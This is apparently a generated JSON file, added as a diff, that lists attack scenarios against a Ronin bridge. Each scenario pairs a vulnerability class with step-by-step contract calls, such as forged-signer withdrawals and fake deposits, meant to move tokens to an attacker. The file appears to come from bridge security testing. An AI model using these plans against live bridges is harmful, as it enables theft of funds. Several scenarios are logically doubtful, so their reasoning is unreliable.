@@ -1,0 +1,629 @@
+{
+  "bridge_name": "ronin_2024",
+  "scenarios": [
+    {
+      "scenario_id": "ronin_deposit_exploit",
+      "target_invariant": "deposit_amount_positive",
+      "vulnerability_class": "fake_deposit",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "qubit_20220127",
+        "meterio_20220205",
+        "metpassport_20220206"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "RoninToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "RoninDeposit",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve RoninDeposit to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "RoninDeposit",
+          "function": "deposit(uint256)",
+          "params": {
+            "amount": "0"
+          },
+          "description": "Exploit the zero amount deposit vulnerability"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve RoninDeposit to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Exploit the zero amount deposit vulnerability"
+        }
+      ]
+    },
+    {
+      "scenario_id": "ronin_gateway_v3_vote_weight_bypass",
+      "target_invariant": "withdraw_vote_weight",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "ronin_20220323"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000000",
+            "signers": [
+              "0x0000000000000000000000000000000000000001"
+            ]
+          },
+          "description": "Exploit uninitialized operatorWeight mapping to bypass vote weight check"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Exploit uninitialized operatorWeight mapping to bypass vote weight check"
+        }
+      ]
+    },
+    {
+      "scenario_id": "ronin_deposit_exploit",
+      "target_invariant": "deposit_token_balance",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.5,
+      "retrieved_exploits": [
+        "meterio_20220205",
+        "metpassport_20220206"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "RoninToken",
+          "function": "transfer(address,uint256)",
+          "params": {
+            "to": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Transfer tokens to attacker to ensure they have sufficient balance for deposit"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "RoninToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "RoninDeposit",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve RoninDeposit to spend attacker's tokens"
+        },
+        {
+          "step": 3,
+          "chain": "source",
+          "contract": "RoninDeposit",
+          "function": "deposit(uint256)",
+          "params": {
+            "amount": "100000000000000000000"
+          },
+          "description": "Deposit tokens into RoninDeposit, exploiting the lack of balance check"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Transfer tokens to attacker to ensure they have sufficient balance for deposit"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Approve RoninDeposit to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Deposit tokens into RoninDeposit, exploiting the lack of balance check"
+        }
+      ]
+    },
+    {
+      "scenario_id": "ronin_deposit_approval_bypass",
+      "target_invariant": "deposit_token_approval",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "metpassport_20220206",
+        "meterio_20220205"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "RoninToken",
+          "function": "transferFrom(address,address,uint256)",
+          "params": {
+            "from": "0x000000000000000000000000000000000000Ab01",
+            "to": "attacker",
+            "amount": "1000000000000000000000"
+          },
+          "description": "Directly transfer tokens from the pre-approved address to attacker without proper approval check"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "RoninDeposit",
+          "function": "deposit(uint256)",
+          "params": {
+            "amount": "1000000000000000000000"
+          },
+          "description": "Deposit the stolen tokens to bridge them to destination chain"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000",
+            "signers": []
+          },
+          "description": "Withdraw the bridged tokens to attacker's address (exploiting missing signer validation)"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Directly transfer tokens from the pre-approved address to attacker without proper approval check"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Deposit the stolen tokens to bridge them to destination chain"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Withdraw the bridged tokens to attacker's address (exploiting missing signer validation)"
+        }
+      ]
+    },
+    {
+      "scenario_id": "ronin_gateway_v3_withdraw_exploit",
+      "target_invariant": "withdraw_token_balance",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.5,
+      "retrieved_exploits": [
+        "multichain_20220118",
+        "metpassport_20220206",
+        "meterio_20220205",
+        "chainswap_20210711",
+        "thorchain_20210716"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000000",
+            "signers": [
+              "0x0000000000000000000000000000000000000001"
+            ]
+          },
+          "description": "Exploit the insufficient vote weight check to withdraw tokens without proper authorization."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Exploit the insufficient vote weight check to withdraw tokens without proper authorization."
+        }
+      ]
+    },
+    {
+      "scenario_id": "ronin_gateway_withdraw_zero_address",
+      "target_invariant": "withdraw_recipient_nonzero",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.5,
+      "retrieved_exploits": [
+        "nomad_20220801"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "0x0000000000000000000000000000000000000000",
+            "amount": "1000000000000000000000",
+            "signers": [
+              "0x0000000000000000000000000000000000000001"
+            ]
+          },
+          "description": "Attempt to withdraw tokens to the zero address, bypassing the recipient non-zero check"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Attempt to withdraw tokens to the zero address, bypassing the recipient non-zero check"
+        }
+      ]
+    },
+    {
+      "scenario_id": "ronin_deposit_event_bypass",
+      "target_invariant": "deposit_event_emission",
+      "vulnerability_class": "fake_deposit",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "qubit_20220127",
+        "meterio_20220205",
+        "metpassport_20220206"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "RoninToken",
+          "function": "transfer(address,uint256)",
+          "params": {
+            "to": "RoninDeposit",
+            "amount": "100000000000000000000"
+          },
+          "description": "Transfer tokens directly to RoninDeposit without using deposit()"
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000",
+            "signers": []
+          },
+          "description": "Attempt to withdraw tokens without proper deposit event"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Transfer tokens directly to RoninDeposit without using deposit()"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Attempt to withdraw tokens without proper deposit event"
+        }
+      ]
+    },
+    {
+      "scenario_id": "ronin_gateway_withdraw_event_bypass",
+      "target_invariant": "withdraw_event_emission",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "qubit_20220127",
+        "meterio_20220205"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000",
+            "signers": []
+          },
+          "description": "Call withdraw with empty signers array to bypass event emission check"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Call withdraw with empty signers array to bypass event emission check"
+        }
+      ]
+    },
+    {
+      "scenario_id": "ronin_deposit_bypass",
+      "target_invariant": "deposit_token_transfer",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "meterio_20220205",
+        "metpassport_20220206"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "RoninToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "RoninDeposit",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve RoninDeposit to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "RoninDeposit",
+          "function": "deposit(uint256)",
+          "params": {
+            "amount": "100000000000000000000"
+          },
+          "description": "Deposit tokens without actually transferring them due to missing transferFrom check"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000",
+            "signers": [
+              "0x000000000000000000000000000000000000Ab01"
+            ]
+          },
+          "description": "Withdraw equivalent tokens on destination chain using pre-approved signer"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve RoninDeposit to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Deposit tokens without actually transferring them due to missing transferFrom check"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Withdraw equivalent tokens on destination chain using pre-approved signer"
+        }
+      ]
+    },
+    {
+      "scenario_id": "ronin_gateway_withdraw_bug",
+      "target_invariant": "withdraw_token_transfer",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "metpassport_20220206",
+        "meterio_20220205"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000",
+            "signers": [
+              "0x000000000000000000000000000000000000Ab01"
+            ]
+          },
+          "description": "Call withdraw with a valid signer but without checking token balance"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Call withdraw with a valid signer but without checking token balance"
+        }
+      ]
+    },
+    {
+      "scenario_id": "ronin_deposit_reentrancy",
+      "target_invariant": "deposit_non_reentrant",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.5,
+      "retrieved_exploits": [
+        "qubit_20220127",
+        "nomad_20220801"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "RoninToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "RoninDeposit",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve RoninDeposit to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "RoninDeposit",
+          "function": "deposit(uint256)",
+          "params": {
+            "amount": "100000000000000000000"
+          },
+          "description": "Deposit tokens to RoninDeposit, triggering potential reentrancy"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve RoninDeposit to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Deposit tokens to RoninDeposit, triggering potential reentrancy"
+        }
+      ]
+    },
+    {
+      "scenario_id": "ronin_gateway_v3_exploit",
+      "target_invariant": "deposit_token_contract",
+      "vulnerability_class": "fake_deposit",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "qubit_20220127",
+        "meterio_20220205"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "RoninToken",
+          "function": "transfer(address,uint256)",
+          "params": {
+            "to": "0x0000000000000000000000000000000000000000",
+            "amount": "100000000000000000000"
+          },
+          "description": "Transfer tokens to address(0) to manipulate balance"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "RoninDeposit",
+          "function": "deposit(uint256)",
+          "params": {
+            "amount": "100000000000000000000"
+          },
+          "description": "Deposit tokens from address(0) which will bypass transferFrom check"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000",
+            "signers": []
+          },
+          "description": "Withdraw tokens to attacker's address"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Transfer tokens to address(0) to manipulate balance"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Deposit tokens from address(0) which will bypass transferFrom check"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Withdraw tokens to attacker's address"
+        }
+      ]
+    },
+    {
+      "scenario_id": "ronin_deposit_zero_address",
+      "target_invariant": "deposit_sender_nonzero",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.5,
+      "retrieved_exploits": [
+        "meterio_20220205",
+        "metpassport_20220206"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "RoninToken",
+          "function": "transferFrom(address,address,uint256)",
+          "params": {
+            "from": "0x000000000000000000000000000000000000Ab01",
+            "to": "RoninDeposit",
+            "amount": "100000000000000000000"
+          },
+          "description": "Transfer tokens from the pre-funded address to the RoninDeposit contract"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "RoninDeposit",
+          "function": "deposit(uint256)",
+          "params": {
+            "amount": "100000000000000000000"
+          },
+          "description": "Deposit tokens into the RoninDeposit contract"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Transfer tokens from the pre-funded address to the RoninDeposit contract"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Deposit tokens into the RoninDeposit contract"
+        }
+      ]
+    }
+  ]
+}
